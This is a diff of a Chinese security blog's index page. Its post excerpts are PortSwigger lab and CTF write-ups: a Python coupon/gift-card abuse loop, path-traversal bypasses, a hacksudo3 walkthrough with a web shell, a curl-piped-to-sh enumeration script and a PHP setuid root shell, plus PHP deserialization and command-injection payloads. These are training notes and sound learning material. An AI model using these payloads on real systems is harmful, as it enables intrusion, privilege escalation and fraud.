@@ -172,6 +172,257 @@
         
 
 <div class="post">
+    <a href="/2023/12/23/PortSwigger%20Business%20Logic%20Vulnerabilities/">
+        <h2 class="post-title">PortSwigger Business Logic Vulnerabilities</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/12/23
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h3 id="lab1-Excessive-trust-in-client-side-controls"><a href="#lab1-Excessive-trust-in-client-side-controls" class="headerlink" title="lab1: Excessive trust in client-side controls"></a>lab1: Excessive trust in client-side controls</h3><p>给了100块 买价值1337的货</p>
+<p>在历史包里发现</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fb90840e4205d4b0371e4175d6c2b352.png" alt="image-20231221161650403"></p>
+<p>尝试直接修改价格</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7db0933e0da92f374fb74c3e6d5c1930.png" alt="image-20231221161858007"></p>
+<h3 id="lab2-High-level-logic-vulnerability"><a href="#lab2-High-level-logic-vulnerability" class="headerlink" title="lab2: High-level logic vulnerability"></a>lab2: High-level logic vulnerability</h3><p>这里把加入购物车时价格可控的点修复了</p>
+<p>但是数量可控 我们可以买负数的东西来加钱</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a95ca8587546ed36721b5ec9bfd703a1.png" alt="image-20231221195033804"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c5b0aa5bbb460b9303ea7f008592064a.png" alt="image-20231221195026120"></p>
+<p>但是返回<code>Cart total price cannot be less than zero</code></p>
+<p>那么控制一下价格 大于0即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6151265ff32b92d60daff8cd3f1159a8.png" alt="image-20231221195234260"></p>
+<h3 id="lab3-Low-level-logic-flaw"><a href="#lab3-Low-level-logic-flaw" class="headerlink" title="lab3: Low-level logic flaw"></a>lab3: Low-level logic flaw</h3><p>买大量的货 溢出上限即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/164ce7acff1b616a63f53627affc78ec.png" alt="image-20231221200558320"></p>
+<p>但是还是卡了我们 必须花钱</p>
+<p>由于这里限制了一次最多加99 大概估计整数的上限是20M左右</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/68a5134dbe70e86ea82b1fbcb0aa6716.png" alt="image-20231221201444558"></p>
+<h3 id="lab4-Inconsistent-handling-of-exceptional-input"><a href="#lab4-Inconsistent-handling-of-exceptional-input" class="headerlink" title="lab4: Inconsistent handling of exceptional input"></a>lab4: Inconsistent handling of exceptional input</h3><p>需求: 删除carlos</p>
+<p>访问admin路由</p>
+<p><code>Admin interface only available if logged in as a DontWannaCry user</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f6dee7a5ea454d346471e3b405e361d2.png" alt="image-20231221202658065"></p>
+<p>我们可以接收任何 以@exploit-0a2300c90469cc9d80ea5232011200d0.exploit-server.net结尾的邮箱</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/76942b60f3a1c98e02088e8cf801bb1e.png" alt="image-20231221203451674"></p>
+<p>在这里超过255的字符会被截断</p>
+<p>我们卡一下长度</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/bb87871540a53b08cfc4151c6baba83f.png" alt="image-20231221204405162"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1f551abb364dd05517b6c0e7cb5f351f.png" alt="image-20231221204508364"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7dd8349f5dba5e1bcbdd6fc5f7cf9ff2.png" alt="image-20231221204639955"></p>
+<h3 id="lab5-Inconsistent-security-controls"><a href="#lab5-Inconsistent-security-controls" class="headerlink" title="lab5: Inconsistent security controls"></a>lab5: Inconsistent security controls</h3><p>注册完后直接更新邮箱</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2c3f89746fb632f5fdeda377c7a19ca7.png" alt="image-20231222081215947"></p>
+<h3 id="lab6-Weak-isolation-on-dual-use-endpoint"><a href="#lab6-Weak-isolation-on-dual-use-endpoint" class="headerlink" title="lab6: Weak isolation on dual-use endpoint"></a>lab6: Weak isolation on dual-use endpoint</h3><p>直接不提交旧密码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/583f3fdbc6296d61a50bb8e054ab9fd1.png" alt="image-20231222082355525"></p>
+<h3 id="lab7-Insufficient-workflow-validation"><a href="#lab7-Insufficient-workflow-validation" class="headerlink" title="lab7: Insufficient workflow validation"></a>lab7: Insufficient workflow validation</h3><p>先跟一个正常的购买流程 </p>
+<p>&#x2F;cart 添加进购物车 -&gt; &#x2F;cart&#x2F;checkout 清算 -&gt; &#x2F;cart&#x2F;order-confirmation?order-confirmed&#x3D;true 结算</p>
+<p>每个流程都重复发包 然后刷新观察</p>
+<p>我们发现在checkout的时候就已经进扣钱了</p>
+<p>尝试跳过checkout 添加购物车后直接confirm</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/86321374a1a5befcdd38c047d62ca547.png" alt="image-20231222090150331"></p>
+<p>这里false和true没影响好像</p>
+<p>一开始是想看看能不能反悔</p>
+<h3 id="lab8-Authentication-bypass-via-flawed-state-machine"><a href="#lab8-Authentication-bypass-via-flawed-state-machine" class="headerlink" title="lab8: Authentication bypass via flawed state machine"></a>lab8: Authentication bypass via flawed state machine</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/97fa36f695dae221dbdc64d7c168c3f9.png" alt="image-20231222091018797"></p>
+<p>改administrator 和 admin 都没用</p>
+<p>尝试login 然后drop掉role-selector</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f111591016f07fee8af7241d74b3e92a.png" alt="image-20231222092405290"></p>
+<h3 id="lab9-Flawed-enforcement-of-business-rules"><a href="#lab9-Flawed-enforcement-of-business-rules" class="headerlink" title="lab9: Flawed enforcement of business rules"></a>lab9: Flawed enforcement of business rules</h3><p><code>New customers use code at checkout: NEWCUST5</code></p>
+<p>注册能领30 off 检测是否重复只检测上一个</p>
+<p>然后俩折扣来回叠加</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9f40b7e68c8311dcaa44ccde2b01f05e.png" alt="image-20231222103930811"></p>
+<h3 id="lab10-Infinite-money-logic-flaw"><a href="#lab10-Infinite-money-logic-flaw" class="headerlink" title="lab10: Infinite money logic flaw"></a>lab10: Infinite money logic flaw</h3><p>注册送券 <code>SIGNUP30</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/523f92546b698bfd0cd2558bca7d1b0c.png" alt="image-20231222105437164"></p>
+<p>买giftcart 赚3块 无限薅</p>
+<p>现在需要实现自动化</p>
+<p>添加购物车 -&gt; 加券 -&gt; 兑换</p>
+<pre><code class="py">import requests
+import re
+
+csrfPartten = re.compile(&#39;&lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;.*&quot;&gt;&#39;)
+codePartten = re.compile(&#39;&lt;td&gt;.*&lt;/td&gt;&#39;)
+url = &quot;https://0add00500314e8f081b017cf00d400a0.web-security-academy.net/&quot;
+Cookie = &quot;VpVhq6vKnkAwKWFRosMkSD8TFaaVJP27&quot;
+sess = requests.Session()
+
+def do_cart():
+    data = &#123;
+        &quot;productId&quot;: 2,
+        &quot;redir&quot;: &quot;PRODUCT&quot;,
+        &quot;quantity&quot;: 1
+    &#125;
+    
+    res = sess.post(url+&quot;cart&quot;, data=data,cookies=&#123;&quot;session&quot;:Cookie&#125;)
+    
+    return res
+
+
+
+def getCsrf():
+    res = sess.get(url+&quot;my-account?id=wiener&quot;,
+              cookies=&#123;&quot;session&quot;: Cookie&#125;)
+    csrf = re.findall(csrfPartten, res.text)[0]
+    return(csrf.split(&quot;=&quot;)[3].replace(&#39;&quot;&#39;, &quot;&quot;).replace(&quot;&gt;&quot;, &quot;&quot;))
+
+csrf = getCsrf()
+
+def do_coupon():
+    
+    data = &#123;
+        &quot;coupon&quot;:&quot;SIGNUP30&quot;,
+        &quot;csrf&quot;:csrf
+    &#125;
+    res = sess.post(url+&quot;cart/coupon&quot;, data=data,cookies=&#123;&quot;session&quot;:Cookie&#125;)
+    
+    return res
+def do_checkout():
+    data = &#123;
+        &quot;csrf&quot;: csrf
+    &#125;
+    res = sess.post(url+&quot;cart/checkout&quot;, data=data,
+                    cookies=&#123;&quot;session&quot;: Cookie&#125;)
+    code = re.findall(codePartten, res.text)
+    return code[2:]
+    
+
+    
+
+def do_redeem(code):
+    data = &#123;
+        &quot;gift-card&quot;: code[0].replace(&quot;&lt;td&gt;&quot;,&quot;&quot;).replace(&quot;&lt;/td&gt;&quot;,&quot;&quot;),
+        &quot;csrf&quot;: csrf
+    &#125;
+    res = sess.post(url+&quot;gift-card&quot;, data=data,
+                    cookies=&#123;&quot;session&quot;: Cookie&#125;)
+
+while True:
+
+    do_cart()
+    do_coupon()
+    do_redeem(do_checkout())
+</code></pre>
+<p>不考虑效率 跑个半个小时左右就好了</p>
+<p>主要还是交互太慢了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4491a98ec8a252a62e15a6ac986d3e8a.png" alt="image-20231222130923509"></p>
+<h3 id="lab11-Authentication-bypass-via-encryption-oracle"><a href="#lab11-Authentication-bypass-via-encryption-oracle" class="headerlink" title="lab11: Authentication bypass via encryption oracle"></a>lab11: Authentication bypass via encryption oracle</h3><p>post&#x2F;comment处会将emil加密</p>
+<p>猜测和stay-logged-in是同种方式</p>
+<p>尝试将stay-logged-in的值解密</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7a701350bdef91c9a72efa03a9225800.png" alt="image-20231222133525271"></p>
+<p>可以看见是用户名加时间戳 将其在emil处提交加密</p>
+<p><code>administrator:1703222719341</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/afef0a78fe6208a1432a228ffcefa31b.png" alt="image-20231222134653363"></p>
+<p>前面还有<code>Invalid email address:</code> 23个字符</p>
+<p>考虑到一般这种都是块加密 补齐至32个字符</p>
+<p>然后把cipher的前32位删了<img src="https://img-blog.csdnimg.cn/img_convert/6a18119d50b9fe092fe0036493ab30b3.png" alt="image-20231222140616052"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/521c6f53392bfa9502a7746681fcffe0.png" alt="image-20231222140333592"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6a059bb27e677feadc78fbd1cc8a9620.png" alt="image-20231222140522765"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #ffa2c4">服务器</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #00bcd4">数据库</a>
+        </span>
+        
+    </div>
+    <a href="/2023/12/23/PortSwigger%20Business%20Logic%20Vulnerabilities/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/12/23/portswigger%20pathTraversal/">
+        <h2 class="post-title">portswigger pathTraversal</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/12/23
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h3 id="lab1-File-path-traversal-simple-case"><a href="#lab1-File-path-traversal-simple-case" class="headerlink" title="lab1: File path traversal, simple case"></a>lab1: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">File path traversal</a>, simple case</h3><p>展示图片处参数可控</p>
+<p><code>https://0a2300e3039e268d80068f9f001800e4.web-security-academy.net/image?filename=38.jpg</code></p>
+<p>尝试路径穿越</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/45c36673f98218cf15f33f50d322d8e5.png" alt="image-20231221122222634"></p>
+<h3 id="lab2-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"><a href="#lab2-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass" class="headerlink" title="lab2: File path traversal, traversal sequences blocked with absolute path bypass"></a>lab2: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">File path traversal</a>, traversal sequences blocked with absolute path bypass</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/897cd00442341ff275a45531ae96ef04.png" alt="image-20231221122515665"></p>
+<p>直接用绝对路径</p>
+<h3 id="lab3-File-path-traversal-traversal-sequences-stripped-non-recursively"><a href="#lab3-File-path-traversal-traversal-sequences-stripped-non-recursively" class="headerlink" title="lab3: File path traversal, traversal sequences stripped non-recursively"></a>lab3: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">File path traversal</a>, traversal sequences stripped non-recursively</h3><p>由于并不进行递归的替换 双写即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/df4cd6d0068d066f7c38376e9d4cc606.png" alt="image-20231221122731558"></p>
+<h3 id="lab4-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode"><a href="#lab4-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode" class="headerlink" title="lab4: File path traversal, traversal sequences stripped with superfluous URL-decode"></a>lab4: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">File path traversal</a>, traversal sequences stripped with superfluous URL-decode</h3><p>存在多次url解码 我们多次编码即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fbf04318ade8858bd7dbc148b13ab11d.png" alt="image-20231221123224619"></p>
+<h3 id="lab5-File-path-traversal-validation-of-start-of-path"><a href="#lab5-File-path-traversal-validation-of-start-of-path" class="headerlink" title="lab5: File path traversal, validation of start of path"></a>lab5: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">File path traversal</a>, validation of start of path</h3><p>限定前部分必须是&#x2F;var&#x2F;www&#x2F;images&#x2F; 直接穿越即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f5b9c02b421726f9a31d4ec52fe8d048.png" alt="image-20231221131556193"></p>
+<h3 id="lab6-File-path-traversal-validation-of-file-extension-with-null-byte-bypass"><a href="#lab6-File-path-traversal-validation-of-file-extension-with-null-byte-bypass" class="headerlink" title="lab6: File path traversal, validation of file extension with null byte bypass"></a>lab6: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">File path traversal</a>, validation of file extension with null byte bypass</h3><p>限定扩展名</p>
+<p>用%00绕过</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/539af8ee3bfb3086ab42f89801bdf75b.png" alt="image-20231221131733181"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/12/23/portswigger%20pathTraversal/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/12/22/Portswigger%20sql%E6%B3%A8%E5%85%A5/">
         <h2 class="post-title">Portswigger sql注入</h2>
     </a>
@@ -315,22 +566,22 @@ for i in range(1, 666):
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #03a9f4">数据库</a>
+            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #00bcd4">数据库</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/sql/" style="color: #ff7d73">sql</a>
+            <a href="/tags/sql/" style="color: #00a596">sql</a>
         </span>
         
     </div>
@@ -1151,12 +1402,12 @@ print(&quot;&quot;.join(res))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
     </div>
@@ -1334,12 +1585,12 @@ DASHDASHDOTDOTDOT DASHDOTDOT
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
     </div>
@@ -1540,7 +1791,7 @@ for i in res1:
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
@@ -1619,12 +1870,12 @@ print(long_to_bytes(pow(c,d,pp*qq)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
     </div>
@@ -1723,12 +1974,12 @@ public class CC2 &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00bcd4">开发语言</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #ff7d73">java</a>
+            <a href="/tags/java/" style="color: #00bcd4">java</a>
         </span>
         
     </div>
@@ -1773,12 +2024,12 @@ public class CC2 &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
         </span>
         
     </div>
@@ -2116,407 +2367,21 @@ public class CC3 &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
     </div>
     <a href="/2023/08/09/CommonCollections3%E9%93%BE%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/08/07/hacksudo3%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
-        <h2 class="post-title">hacksudo3 通关详解</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/8/7
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>一开始桥接错网卡了 搞了半天 改回来就行了</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/77b085a4965945089e4efd752219fcd4.png" alt="在这里插入图片描述"></p>
-<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫个目录<br><img src="https://img-blog.csdnimg.cn/6a78d32b8bc746239c8cf3583c4ce9b4.png" alt="在这里插入图片描述"><br>大概看了一眼没什么有用的信息 然后对着login.php跑了一下弱口令 sqlmap<br>都没跑出来 那么利用点应该不在这 考虑到之前有过dirsearch字典太小扫不到东西的经历<br>换个gobuster扫一下<br><img src="https://img-blog.csdnimg.cn/3dee063911db44ce96cbcc491d0ac026.png" alt="在这里插入图片描述"><br>先看看generator.php<br><img src="https://img-blog.csdnimg.cn/a9025eb98b0445379fc124f0e753ffbe.png" alt="在这里插入图片描述">随便填点东西执行一下 感觉像命令注入<br><img src="https://img-blog.csdnimg.cn/c51178f60f214846af55040ad8f77d83.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bb57ad44e67047758e2f5fe366003b4b.png" alt="在这里插入图片描述"><br>尝试弹个shell<br>没成功<br>那就写了个一句话 然后用蚁剑传shell<br><img src="https://img-blog.csdnimg.cn/aeaa9d7243ee4884879b9e01449decf5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fda42949852141f48c83230df31ecc10.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6a6885383b3d40bfa310e0efe06c5769.png" alt="在这里插入图片描述"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/9ea476d0bf444708a1febdf92d6655e2.png" alt="在这里插入图片描述"></p>
-<p>看看还有没有用户,有可能待会会切过去<br><img src="https://img-blog.csdnimg.cn/00a360113c734409afbdee01f52b3dfd.png" alt="在这里插入图片描述"><br>用linpeas枚举脆弱性<br><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code><br><img src="https://img-blog.csdnimg.cn/c864be3fe2cb4dbc8033971314fc5cde.png" alt="在这里插入图片描述"></p>
-<p>没看见特别显眼的<br><img src="https://img-blog.csdnimg.cn/7636f4070eaf40b58bcd57050d9334dd.png" alt="在这里插入图片描述"><br>版本过高<br>考虑到有个hacksudo的用户<br>再收集一波信息看看能不能切过去<br>发现有个hacksudo的文件 <img src="https://img-blog.csdnimg.cn/50502f6f887c49aebd25668c9bc0def7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0a7389c521ab462185fdd0474acd218e.png" alt="在这里插入图片描述"><br>有加密 一眼凯撒<br><img src="https://img-blog.csdnimg.cn/9d1b8d0b91174a96ba8c3195570fcecb.png" alt="试试"><br><img src="https://img-blog.csdnimg.cn/5d7b8c1ddb5c49a38264fce2174de9b9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0b55f6c69e6643899def33c14f9a1253.png" alt="在这里插入图片描述"></p>
-<p>没有sudo权限<br><img src="https://img-blog.csdnimg.cn/4b97b8f4a9494eefb8c1be96d0ff31cc.png" alt="在这里插入图片描述"><br>在work路径下发现sh文件<br>没执行权限<br>也没看见相关的计划任务<br>再传个linpeas枚举<br><img src="https://img-blog.csdnimg.cn/dfa91d083f1b478ab029c730db82e9b4.png" alt="在这里插入图片描述"><br>可以lxd提权<br><img src="https://img-blog.csdnimg.cn/696ebe4ba82647f79f404a46cc5753b1.png" alt="在这里插入图片描述"><br>也可以view 或 php提权<br>这里用php提权</p>
-<pre><code class="bash">CMD=&quot;/bin/sh&quot;
-./home/hacksudo/locker/php -r &quot;posix_setuid(0); system(&#39;$CMD&#39;);&quot;
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/e187ecf8f2a44c7fbc974ae3193d7547.png" alt="在这里插入图片描述"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/08/07/hacksudo3%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/08/02/NSS%E5%88%B7web3/">
-        <h2 class="post-title">NSS刷web3</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/8/2
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster<img src="https://img-blog.csdnimg.cn/8b1fb6bdc01b4951bb36f01d09ee4ea1.png" alt="在这里插入图片描述"></h1><h1 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h1><p>这题会匹配A或B类<br>如 <code>&quot;A&quot;:1:</code><br>绕不过去 可以考虑快速析构</p>
-<pre><code class="c">&lt;?php
-class A&#123;
-    public $code = &quot;&quot;;
-    function __call($method,$args)&#123;
-        eval($this-&gt;code);
-        
-    &#125;
-    function __wakeup()&#123;
-        $this-&gt;code = &quot;&quot;;
-    &#125;
-&#125;
-
-class B&#123;
-    public $a;
-    function __destruct()&#123;
-        echo $this-&gt;a-&gt;a();
-    &#125;
-&#125;
-$A = new A();
-$poc = new B();
-$poc -&gt; a = $A;
-$A -&gt;code = &#39;phpinfo();&#39;;
-echo serialize($poc);
-
-// if(isset($_REQUEST[&#39;poc&#39;]))&#123;
-//     preg_match_all(&#39;/&quot;[BA]&quot;:(.*?):/s&#39;,$_REQUEST[&#39;poc&#39;],$ret);
-//     if (isset($ret[1])) &#123;
-//         foreach ($ret[1] as $i) &#123;
-//             if(intval($i)!==1)&#123;
-//                 exit(&quot;you want to bypass wakeup ? no !&quot;);
-//             &#125;
-//         &#125;
-//         unserialize($_REQUEST[&#39;poc&#39;]);    
-//     &#125;
-
-
-// &#125;
-</code></pre>
-<p>生成的序列化字符串手动删除最后一个花括号<br>然后试了一下<code>system</code>不能用 应该是进disable_functions了<br><img src="https://img-blog.csdnimg.cn/94758239f870438596c44fe299a450a9.png" alt="在这里插入图片描述"><br>那直接上蚁剑用插件绕<br><img src="https://img-blog.csdnimg.cn/a03ba83d3ef740dba28cfdcf944a55bc.png" alt="在这里插入图片描述"></p>
-<h1 id="GDOUCTF-2023-受不了一点"><a href="#GDOUCTF-2023-受不了一点" class="headerlink" title="[GDOUCTF 2023]受不了一点"></a>[GDOUCTF 2023]受不了一点</h1><p><img src="https://img-blog.csdnimg.cn/929fbdef67c148f9bc82d3b409b46620.png" alt="在这里插入图片描述"></p>
-<h1 id="HNCTF-2022-Week1-easy-html"><a href="#HNCTF-2022-Week1-easy-html" class="headerlink" title="[HNCTF 2022 Week1]easy_html"></a>[HNCTF 2022 Week1]easy_html</h1><p><img src="https://img-blog.csdnimg.cn/40a6fc60e7414f7da9ccbf337037c400.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5473c604e4584b2cbdaf2d6c5b9eb705.png" alt="在这里插入图片描述"></p>
-<h1 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h1><pre><code class="bash">?code=`l&#39;&#39;s /&gt;1`;
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/a6ef59115d454ef69384a6f2e6919a99.png" alt="在这里插入图片描述"></p>
-<pre><code class="lua">?code=`t&#39;&#39;ac  /fffffffffflagafag&gt;1`;
